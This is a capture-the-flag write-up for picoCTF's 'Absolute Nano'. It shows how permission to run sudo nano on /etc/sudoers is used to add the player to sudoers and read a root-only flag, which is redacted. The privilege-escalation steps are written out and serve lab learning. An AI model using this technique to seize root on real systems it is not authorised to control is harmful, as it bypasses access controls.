# ABSOLUTE NANO
Number of Points: 200

## Description
You have complete power with nano. Think you can get the flag?

Additional details will be available after launching your challenge instance.

## Hints
* What can you do with nano?

## Analysis & Solution
After connecting, I automatically check for files.

```bash
# ls -la
total 16
drwxr-xr-x 1 ctf-player ctf-player   20 Mar 23 07:13 .
drwxr-xr-x 1 root       root         24 Feb  4 22:26 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
drwx------ 2 ctf-player ctf-player   34 Mar 23 07:13 .cache
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r--r----- 1 root       root         35 Feb  4 22:26 flag.txt

# cat flag.txt
cat: flag.txt: Permission denied
```
This is so far similar to how it was in [SUDO MAKE ME A SANDWICH](../SUDO%20MAKE%20ME%20A%20SANDWICH/SUDO%20MAKE%20ME%20A%20SANDWICH.md).

```bash
# sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

This time however, the challenge only allows me to work with one file, and that is the "sudoers" file.

**Caution**: In real server management, directly working with sudoers file is not recommended.
Instead you are recommended to run "visudo" then edit it that way, so that it checks if the sudoers file is valid.
Making a mistake in sudoers file can lock you out of ever becoming sudo again!
(Until you turn off the computer and get the hard drive mounted from a different machine/OS and recover... but that's a lot of hassle.)

sudoers file is for controlling who has sudo rights.
By adding `ctf-player` to the sudoers, I should be able to execute sudo on any command I want.

```bash
sudo nano /etc/sudoers

# Underneath root    ALL=(ALL:ALL) ALL, add this line
ctf-player ALL=(ALL:ALL) ALL
```
After saving it with Ctrl+x, you should be able to read the flag.
```bash
sudo cat flag.txt
picoCTF{REDACTED_FLAG_HERE}
```
